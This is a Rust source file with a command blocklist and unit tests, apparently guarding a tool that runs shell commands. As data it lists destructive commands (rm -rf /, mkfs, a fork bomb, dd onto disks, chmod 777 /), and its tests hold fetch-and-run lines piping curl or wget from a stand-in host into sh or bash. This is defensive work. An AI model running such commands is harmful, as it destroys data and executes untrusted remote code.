//! Command sanitization and blocking.
//! Prevents execution of dangerous commands and normalizes user input.

use std::collections::BTreeMap;

/// Normalizes a command string to catch obfuscation attempts.
/// Strips extra whitespace, shell escapes, and common tricks.
fn normalize_cmd(cmd: &str) -> String {
    let mut s = cmd
        .chars()
        .filter(|c| !c.is_control() && *c != '\\')
        .collect::<String>();
    let mut prev = String::new();
    loop {
        let next = s.split_whitespace().collect::<Vec<_>>().join(" ");
        if next == prev {
            break;
        }
        prev = next.clone();
        s = next;
    }
    s.to_lowercase()
}

pub(crate) fn is_command_blocked(cmd: &str) -> bool {
    let normalized = normalize_cmd(cmd);
    if normalized.is_empty() {
        return false;
    }
    // Exact dangerous command patterns (after normalization)
    // Uses word-boundary checks to avoid false positives on benign paths.
    // e.g. "rm -rf /" should match "rm -rf /" but not "rm -rf /tmp"
    let blocked_patterns = [
        "rm -rf --no-preserve-root",
        "rm -rf /*",
        "rm -rf /.",
        "mkfs",
        ":(){:|:&};:",
        "shutdown",
        "reboot",
    ];
    for pat in &blocked_patterns {
        if normalized.contains(pat) {
            return true;
        }
    }
    // rm -rf / (standalone root, not a prefix like /tmp)
    if normalized.contains("rm -rf / ")
        || normalized.ends_with("rm -rf /")
        || normalized.contains("rm -rf /;")
        || normalized.contains("rm -rf /&")
        || normalized.contains("rm -rf /|")
        || normalized.contains("rm -rf /|&")
    {
        return true;
    }
    // Destructive device writes (dd targeting block devices)
    // Use contains to catch full paths like /usr/bin/dd
    let cmd_name = normalized.split_whitespace().next().unwrap_or("");
    let is_dd = cmd_name.ends_with("dd");
    if is_dd && (normalized.contains("of=") || normalized.contains("if=")) {
        let device_targets = ["/dev/sda", "/dev/nvme", "/dev/mmcblk", "/dev/vda", "/dev/hda"];
        if device_targets.iter().any(|t| normalized.contains(t)) {
            return true;
        }
    }
    // chmod 777 on system roots (handles flags between chmod and mode like "chmod -R 777 /")
    if normalized.split_whitespace().any(|w| w.ends_with("chmod"))
        && normalized.split_whitespace().any(|w| w == "777")
        && normalized
            .split_whitespace()
            .any(|w| matches!(w, "/" | "/." | "/*" | "/etc" | "/boot" | "/dev"))
    {
        return true;
    }
    // Destructive wget/curl to pipe to shell (check anywhere, not just first word)
    let has_wget_or_curl = normalized
        .split_whitespace()
        .any(|w| w.ends_with("wget") || w.ends_with("curl"));
    if has_wget_or_curl && normalized.contains("| sh") {
        return true;
    }
    // rm -rf targeting root or common critical dirs
    let words: Vec<&str> = normalized.split_whitespace().collect();
    if words.len() >= 3
        && (words[0] == "rm" || words[0] == "rmdir")
        && words
            .iter()
            .any(|w| *w == "/" || *w == "/." || *w == "/*" || *w == "/etc" || *w == "/boot" || *w == "/dev")
    {
        return true;
    }
    // $(...) command substitution
    if normalized.contains("$(")
        && normalized.contains(')')
        && (normalized.contains("rm ")
            || normalized.contains("dd ")
            || normalized.contains("mkfs")
            || normalized.contains("shutdown")
            || normalized.contains("reboot"))
    {
        return true;
    }
    // Backtick command substitution
    if normalized.contains('`')
        && normalized.chars().filter(|&c| c == '`').count() >= 2
        && (normalized.contains("rm ")
            || normalized.contains("dd ")
            || normalized.contains("mkfs")
            || normalized.contains("shutdown")
            || normalized.contains("reboot"))
    {
        return true;
    }
    // base64 ... | sh decode-and-execute
    if normalized.contains("base64") && (normalized.contains("| sh") || normalized.contains("| bash")) {
        return true;
    }
    // | bash pipe-to-shell
    if normalized.contains("| bash") || normalized.contains("| /bin/bash") || normalized.contains("| /usr/bin/bash") {
        return true;
    }
    false
}

pub(crate) fn looks_like_shell_command(line: &str) -> bool {
    let first = line.split_whitespace().next().unwrap_or_default();
    matches!(
        first,
        "ls" | "pwd" | "cd" | "mkdir" | "cp" | "mv" | "touch" | "cat" | "echo" | "rm" | "find" | "grep"
    )
}

pub(crate) fn sanitize_commands(cmds: &[String]) -> Vec<&str> {
    let mut seen = BTreeMap::<String, ()>::new();
    let mut out = Vec::new();
    for cmd in cmds {
        let key = cmd.trim().to_string();
        if key.is_empty() || seen.contains_key(&key) {
            continue;
        }
        seen.insert(key.clone(), ());
        out.push(cmd.trim());
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocks_dangerous_commands() {
        assert!(!is_command_blocked("rm -rf /tmp"), "rm -rf /tmp should be safe");
        assert!(is_command_blocked("rm -rf / "), "rm -rf / should be blocked");
        assert!(
            !is_command_blocked("rm -rf /var/log"),
            "rm -rf under /var should be safe"
        );
        assert!(is_command_blocked("shutdown now"), "shutdown should be blocked");
        assert!(is_command_blocked("reboot"), "reboot should be blocked");
        assert!(!is_command_blocked("ls -la"));
    }

    #[test]
    fn blocks_wget_pipe_to_shell() {
        assert!(is_command_blocked("curl http://evil.sh | sh"));
        assert!(is_command_blocked("wget http://evil.sh | sh"));
        assert!(!is_command_blocked("curl http://example.com/file.txt"));
    }

    #[test]
    fn blocks_chmod_777_root() {
        assert!(is_command_blocked("chmod 777 /"));
        assert!(!is_command_blocked("chmod 777 /tmp/somefile"));
    }

    #[test]
    fn blocks_dd_to_devices() {
        assert!(is_command_blocked("dd if=/dev/zero of=/dev/sda bs=4M"));
        assert!(!is_command_blocked("dd if=/dev/zero of=./backup.img bs=4M"));
    }

    #[test]
    fn blocks_rm_rf_critical_dirs() {
        assert!(is_command_blocked("rm -rf /etc"));
        assert!(is_command_blocked("rm -rf /boot"));
        assert!(is_command_blocked("rm -rf /dev"));
        assert!(!is_command_blocked("rm -rf ./etc"));
    }

    #[test]
    fn allows_safe_commands() {
        assert!(!is_command_blocked("rm -f /tmp/test.txt"));
        assert!(!is_command_blocked("rm -rf ./node_modules"));
        assert!(!is_command_blocked("docker rm -f mycontainer"));
    }

    #[test]
    fn command_sanitization_dedups() {
        let input = vec![" ls ".to_string(), "ls".to_string(), "".to_string()];
        let out = sanitize_commands(&input);
        assert_eq!(out, vec!["ls"]);
    }

    #[test]
    fn blocks_chmod_r_777_root() {
        assert!(is_command_blocked("chmod -R 777 /"), "chmod -R 777 / should be blocked");
        assert!(is_command_blocked("chmod 777 -R /"), "chmod 777 -R / should be blocked");
        assert!(
            is_command_blocked("chmod -R 777 /etc"),
            "chmod -R 777 /etc should be blocked"
        );
    }

    #[test]
    fn blocks_dd_full_path() {
        assert!(
            is_command_blocked("/usr/bin/dd if=/dev/zero of=/dev/sda bs=4M"),
            "full path dd should be blocked"
        );
        assert!(
            is_command_blocked("/sbin/dd if=/dev/zero of=/dev/nvme0n1"),
            "sbin dd should be blocked"
        );
    }

    #[test]
    fn blocks_dd_without_if_of() {
        assert!(!is_command_blocked("dd --help"), "dd --help should not be blocked");
        assert!(
            !is_command_blocked("/usr/bin/dd --version"),
            "dd version should not be blocked"
        );
    }

    #[test]
    fn blocks_command_substitution_dollar_paren() {
        assert!(
            is_command_blocked("rm $(find / -name '*.cfg')"),
            "$() with rm should be blocked"
        );
        assert!(
            is_command_blocked("dd $(echo of=/dev/sda)"),
            "$() with dd should be blocked"
        );
        assert!(
            !is_command_blocked("echo $(pwd)"),
            "$() with benign command should be safe"
        );
    }

    #[test]
    fn blocks_backtick_substitution() {
        assert!(
            is_command_blocked("rm `find / -name '*.cfg'`"),
            "backtick with rm should be blocked"
        );
        assert!(
            !is_command_blocked("echo `pwd`"),
            "backtick with benign command should be safe"
        );
    }

    #[test]
    fn blocks_base64_pipe_sh() {
        assert!(
            is_command_blocked("echo 'ZmxhZw==' | base64 -d | sh"),
            "base64 | sh should be blocked"
        );
        assert!(
            is_command_blocked("cat payload.b64 | base64 -d | bash"),
            "base64 | bash should be blocked"
        );
    }

    #[test]
    fn blocks_pipe_bash() {
        assert!(
            is_command_blocked("curl http://evil.sh | bash"),
            "| bash should be blocked"
        );
        assert!(
            is_command_blocked("wget -O- http://evil.sh | /bin/bash"),
            "| /bin/bash should be blocked"
        );
    }
}
